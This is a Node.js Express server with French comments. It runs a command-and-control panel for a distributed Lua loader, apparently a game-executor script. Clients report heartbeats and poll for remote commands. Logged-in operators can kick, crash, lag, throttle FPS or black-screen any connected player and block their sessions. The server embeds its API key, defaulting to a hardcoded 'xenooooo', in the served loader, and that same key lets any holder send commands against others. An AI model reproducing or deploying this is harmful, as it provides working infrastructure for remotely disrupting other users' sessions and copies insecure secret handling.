import express from 'express';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import cookie from 'cookie';
import { fileURLToPath } from 'url';
import { isAllowed, hasAllowlist } from './allowedUsers.js';
import { startBot, sendLog, COLORS } from './bot.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.set('trust proxy', 1);

// //api/... (double slash) ne doit pas tomber sur la page login
app.use((req, _res, next) => {
    if (req.url.includes('//')) req.url = req.url.replace(/\/{2,}/g, '/');
    next();
});

app.use(express.json({ limit: '5mb' }));

const API_KEY = process.env.API_KEY || "xenooooo";
const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID || "";
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || "";
const SESSION_COOKIE = "site_session";
const OAUTH_STATE_COOKIE = "oauth_state";
const SESSION_MAX_AGE = 7 * 24 * 60 * 60; // 7 jours
const TTL_MS = 15000;

const sessions = new Map(); // token -> { id, username }

const cookieSecure = () => process.env.NODE_ENV === "production";

const getBaseUrl = (req) => {
    const proto = req.header("x-forwarded-proto") || req.protocol;
    const host = req.get("host");
    return `${proto}://${host}`.replace(/\/+$/, "");
};

const getSessionToken = (req) => {
    const cookies = cookie.parse(req.headers.cookie || "");
    return cookies[SESSION_COOKIE] || null;
};

const isAuthed = (req) => {
    const token = getSessionToken(req);
    return Boolean(token && sessions.has(token));
};

const getAuthedUser = (req) => {
    const token = getSessionToken(req);
    if (!token) return null;
    return sessions.get(token) || null;
};

const formatActor = (user) => {
    if (!user?.id) return "inconnu";
    return `<@${user.id}> (\`${user.username || user.id}\`)`;
};

const setSessionCookie = (res, token) => {
    res.append(
        "Set-Cookie",
        cookie.serialize(SESSION_COOKIE, token, {
            httpOnly: true,
            path: "/",
            sameSite: "lax",
            maxAge: SESSION_MAX_AGE,
            secure: cookieSecure(),
        })
    );
};

const clearSessionCookie = (res) => {
    res.append(
        "Set-Cookie",
        cookie.serialize(SESSION_COOKIE, "", {
            httpOnly: true,
            path: "/",
            sameSite: "lax",
            maxAge: 0,
            secure: cookieSecure(),
        })
    );
};

const setOAuthStateCookie = (res, state) => {
    res.append(
        "Set-Cookie",
        cookie.serialize(OAUTH_STATE_COOKIE, state, {
            httpOnly: true,
            path: "/",
            sameSite: "lax",
            maxAge: 600,
            secure: cookieSecure(),
        })
    );
};

const clearOAuthStateCookie = (res) => {
    res.append(
        "Set-Cookie",
        cookie.serialize(OAUTH_STATE_COOKIE, "", {
            httpOnly: true,
            path: "/",
            sameSite: "lax",
            maxAge: 0,
            secure: cookieSecure(),
        })
    );
};

const needsSiteAuth = (pathname) => {
    if (pathname === "/login") return false;
    if (pathname.startsWith("/api/")) return false;
    if (pathname === "/loader.lua") return false;
    return true;
};

const players = new Map();
const commands = new Map();
const blockedSessions = new Set();

const playerLabel = (id) => {
    const p = players.get(String(id));
    if (!p) return `\`${id}\``;
    return `**${p.username || id}** (\`${id}\`)`;
};

const clearOneShotFlags = (id) => {
    const c = commands.get(id);
    if (!c) return;
    let changed = false;
    if (c.kick) { delete c.kick; changed = true; }
    if (c.crash) { delete c.crash; changed = true; }
    if (changed) commands.set(id, c);
};

// Vraie déco : coupe aussi reset / black_screen pour pas que ça reste au retour
const clearLeaveFlags = (id) => {
    const c = commands.get(id);
    if (!c) return;
    let changed = false;
    if (c.reset) { c.reset = false; changed = true; }
    if (c.black_screen) { c.black_screen = false; changed = true; }
    if (c.kick) { delete c.kick; changed = true; }
    if (c.crash) { delete c.crash; changed = true; }
    if (changed) commands.set(id, c);
};

// Nettoyage des joueurs inactifs (+ coupe reset/kick/crash pour pas que ça reste au retour)
setInterval(() => {
    const cutoff = Date.now() - TTL_MS;
    for (const [id, p] of players) {
        if ((p.lastHeartbeat || 0) < cutoff) {
            players.delete(id);
            clearLeaveFlags(id);
        }
    }
}, 5000);

// Middleware d'authentification (protège par X-Api-Key)
const auth = (req, res, next) => {
    const k = req.header("X-Api-Key") || req.query.key;
    if (k !== API_KEY) return res.status(401).json({ error: "unauthorized" });
    next();
};

const requireSiteAuth = (req, res, next) => {
    if (isAuthed(req)) return next();
    return res.status(401).json({ error: "unauthorized" });
};

const listPlayers = () =>
    Array.from(players.values()).map((p) => ({
        ...p,
        online: Date.now() - (p.lastHeartbeat || 0) < TTL_MS,
    }));

const applyCommand = (req, res) => {
    const b = req.body || {};
    const id = String(b.user_id || "");
    if (!id) return res.status(400).json({ error: 'missing user_id' });
    const cur = commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false, reset: false, black_screen: false };
    const next = { ...cur };
    if (typeof b.fps_limit === 'boolean') next.fps_limit = b.fps_limit;
    if (typeof b.lag_n === 'boolean') next.lag_n = b.lag_n;
    if (typeof b.lag_c === 'boolean') next.lag_c = b.lag_c;
    if (typeof b.reset === 'boolean') next.reset = b.reset;
    if (typeof b.black_screen === 'boolean') next.black_screen = b.black_screen;
    if (b.kick) next.kick = true;
    if (b.crash) next.crash = true;
    // Script lua au boot : purge kick/crash pour pas freeze au relaunch
    if (b.clear_oneshot) {
        delete next.kick;
        delete next.crash;
    }
    commands.set(id, next);

    const actor = getAuthedUser(req);
    const target = playerLabel(id);

    if (b.kick) {
        sendLog({
            title: "Kick",
            type: "action",
            color: COLORS.kick,
            fields: [
                { name: "Par", value: formatActor(actor), inline: true },
                { name: "Cible", value: target, inline: true },
            ],
        });
    }
    if (b.crash) {
        sendLog({
            title: "Crash",
            type: "action",
            color: COLORS.crash,
            fields: [
                { name: "Par", value: formatActor(actor), inline: true },
                { name: "Cible", value: target, inline: true },
            ],
        });
    }

    const toggles = [];
    for (const key of ["fps_limit", "lag_n", "lag_c", "reset", "black_screen"]) {
        if (typeof b[key] === "boolean" && b[key] !== cur[key]) {
            toggles.push(`\`${key}\` → **${b[key] ? "ON" : "OFF"}**`);
        }
    }
    if (toggles.length) {
        sendLog({
            title: "Action panel",
            type: "action",
            color: COLORS.action,
            description: toggles.join("\n"),
            fields: [
                { name: "Par", value: formatActor(actor), inline: true },
                { name: "Cible", value: target, inline: true },
            ],
        });
    }

    // kick / crash = one-shot, purge rapide au cas où le GET ne les consomme pas
    if (b.kick || b.crash) {
        setTimeout(() => {
            const c = commands.get(id);
            if (c) { delete c.kick; delete c.crash; commands.set(id, c); }
        }, 8000);
    }
    res.json({ ok: true });
};

// --- ROUTES POUR LE SCRIPT LUA ---

// Le lua envoie le heartbeat ici
app.post('/api/public/heartbeat', auth, (req, res) => {
    const b = req.body || {};
    if (!b.user_id) return res.status(400).json({ error: 'missing user_id' });
    const id = String(b.user_id);
    const sessionId = String(b.session_id || "");
    if (sessionId && blockedSessions.has(sessionId)) {
        return res.status(403).json({ error: 'blocked', blocked: true });
    }
    const prev = players.get(id);
    const gap = prev ? Date.now() - (prev.lastHeartbeat || 0) : Infinity;
    // Petit trou réseau / respawn : on coupe seulement kick/crash (one-shot).
    // PAS reset/black_screen — sinon le reset se coupe tout seul pendant les morts.
    if (gap > 6000) clearOneShotFlags(id);
    players.set(id, { ...b, lastHeartbeat: Date.now() });
    console.log(`[heartbeat] ${b.username || b.user_id} (${b.executor || '?'})`);
    res.json({ ok: true });
});

// Le lua récupère ses commandes ici (kick/crash consommés dès la 1ère lecture)
app.get('/api/public/command', auth, (req, res) => {
    const id = String(req.query.user_id || "");
    const cur = commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false, reset: false, black_screen: false };
    const out = { ...cur };
    if (cur.kick || cur.crash) {
        delete cur.kick;
        delete cur.crash;
        commands.set(id, cur);
    }
    res.json(out);
});

// --- ROUTES POUR LE DASHBOARD (VISUEL) ---

app.get('/api/public/players', auth, (req, res) => {
    res.json({ players: listPlayers() });
});

app.get('/api/players', auth, (req, res) => {
    res.json({ players: listPlayers() });
});

app.get('/api/dashboard/players', requireSiteAuth, (req, res) => {
    res.json({ players: listPlayers() });
});

app.get('/api/command_state', auth, (req, res) => {
    const id = String(req.query.user_id || "");
    res.json(commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false, reset: false, black_screen: false });
});

app.get('/api/dashboard/command', requireSiteAuth, (req, res) => {
    const id = String(req.query.user_id || "");
    res.json(commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false, reset: false, black_screen: false });
});

app.post('/api/command', auth, applyCommand);
app.post('/api/dashboard/command', requireSiteAuth, applyCommand);

app.post('/api/public/command', auth, applyCommand);

const removePlayerById = (req, res) => {
    const id = String(req.params.userId || "");
    if (!id) return res.status(400).json({ error: "missing user_id" });
    const player = players.get(id);
    const label = playerLabel(id);
    if (player?.session_id) blockedSessions.add(String(player.session_id));
    players.delete(id);
    commands.delete(id);
    console.log(`[delete] removed ${id}`);
    sendLog({
        title: "Joueur retiré",
        type: "action",
        color: COLORS.delete,
        fields: [
            { name: "Par", value: formatActor(getAuthedUser(req)), inline: true },
            { name: "Cible", value: label, inline: true },
        ],
    });
    res.json({ ok: true });
};

app.delete('/api/dashboard/players/:userId', requireSiteAuth, removePlayerById);
app.delete('/api/players/:userId', auth, removePlayerById);

// --- AUTH SITE (Discord OAuth) ---

app.get("/api/auth/status", (req, res) => {
    if (isAuthed(req)) return res.json({ ok: true });
    res.status(401).json({ error: "unauthorized" });
});

app.get("/api/auth/discord", (req, res) => {
    if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET) {
        return res.redirect("/login?error=not_configured");
    }

    const state = crypto.randomBytes(16).toString("hex");
    setOAuthStateCookie(res, state);

    const params = new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        redirect_uri: `${getBaseUrl(req)}/api/auth/discord/callback`,
        response_type: "code",
        scope: "identify",
        state,
    });

    res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
});

app.get("/api/auth/discord/callback", async (req, res) => {
    const redirectLogin = (error) => {
        clearOAuthStateCookie(res);
        return res.redirect(`/login?error=${encodeURIComponent(error)}`);
    };

    if (req.query.error) {
        return redirectLogin(String(req.query.error));
    }

    const code = String(req.query.code || "");
    const state = String(req.query.state || "");
    const cookies = cookie.parse(req.headers.cookie || "");
    const expectedState = cookies[OAUTH_STATE_COOKIE] || "";

    if (!code || !state || !expectedState || state !== expectedState) {
        return redirectLogin("invalid_state");
    }

    if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET) {
        return redirectLogin("not_configured");
    }

    const redirectUri = `${getBaseUrl(req)}/api/auth/discord/callback`;

    try {
        const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
                client_id: DISCORD_CLIENT_ID,
                client_secret: DISCORD_CLIENT_SECRET,
                grant_type: "authorization_code",
                code,
                redirect_uri: redirectUri,
            }),
        });

        if (!tokenRes.ok) {
            console.error("[discord] token exchange failed", await tokenRes.text());
            return redirectLogin("token_failed");
        }

        const tokenData = await tokenRes.json();
        const accessToken = tokenData.access_token;
        if (!accessToken) return redirectLogin("token_failed");

        const userRes = await fetch("https://discord.com/api/users/@me", {
            headers: { Authorization: `Bearer ${accessToken}` },
        });

        if (!userRes.ok) {
            console.error("[discord] user fetch failed", await userRes.text());
            return redirectLogin("user_failed");
        }

        const user = await userRes.json();
        const discordId = String(user.id || "");

        if (!discordId) return redirectLogin("user_failed");

        if (hasAllowlist() && !isAllowed(discordId)) {
            console.warn(`[discord] denied id=${discordId} user=${user.username}`);
            sendLog({
                title: "Connexion refusée",
                type: "login",
                color: COLORS.deny,
                fields: [
                    { name: "Discord", value: `<@${discordId}> (\`${user.username}\`)`, inline: true },
                    { name: "ID", value: `\`${discordId}\``, inline: true },
                ],
            });
            return redirectLogin("not_allowed");
        }

        const token = crypto.randomBytes(32).toString("hex");
        sessions.set(token, { id: discordId, username: user.username || discordId });
        clearOAuthStateCookie(res);
        setSessionCookie(res, token);
        console.log(`[discord] login ok id=${discordId} user=${user.username}`);
        sendLog({
            title: "Connexion panel",
            type: "login",
            color: COLORS.login,
            fields: [
                { name: "Utilisateur", value: `<@${discordId}> (\`${user.username}\`)`, inline: true },
                { name: "ID", value: `\`${discordId}\``, inline: true },
            ],
        });
        return res.redirect("/");
    } catch (err) {
        console.error("[discord] oauth error", err);
        return redirectLogin("oauth_error");
    }
});

app.post("/api/auth/logout", (req, res) => {
    const token = getSessionToken(req);
    const user = token ? sessions.get(token) : null;
    if (token) sessions.delete(token);
    clearSessionCookie(res);
    if (user) {
        sendLog({
            title: "Déconnexion panel",
            type: "login",
            color: COLORS.logout,
            fields: [
                { name: "Utilisateur", value: formatActor(user), inline: true },
            ],
        });
    }
    res.json({ ok: true });
});

app.get("/login", (req, res) => {
    if (isAuthed(req)) return res.redirect("/");
    res.sendFile(path.join(__dirname, "login.html"));
});

// --- ROUTE POUR DISTRIBUER LE LOADER.LUA ---
app.get('/loader.lua', (req, res) => {
    const proto = req.header('x-forwarded-proto') || req.protocol;
    const host = req.get('host');
    const base = `${proto}://${host}`.replace(/\/+$/, '');

    const templatePath = path.join(__dirname, 'loader.template.lua');
    try {
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace('__BASE__', base).replace('__KEY__', API_KEY);
        res.type('text/plain').send(template);
    } catch (e) {
        console.error('loader.template.lua missing:', e.message);
        res.status(500).type('text/plain').send('-- loader.template.lua missing on server, redeploy the project');
    }
});

// --- SERVIR LE DASHBOARD REACT (Le Visuel) ---
app.use((req, res, next) => {
    if (!needsSiteAuth(req.path)) return next();
    if (isAuthed(req)) return next();
    return res.redirect("/login");
});

app.use(express.static(path.join(__dirname, 'dist')));

// On place le Dashboard à la fin avec une fonction qui exclut les routes API et Loader
app.get(/^(?!\/api|\/loader\.lua|\/login).*$/, (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
    startBot().catch((err) => console.error("[bot] failed to start:", err));
});
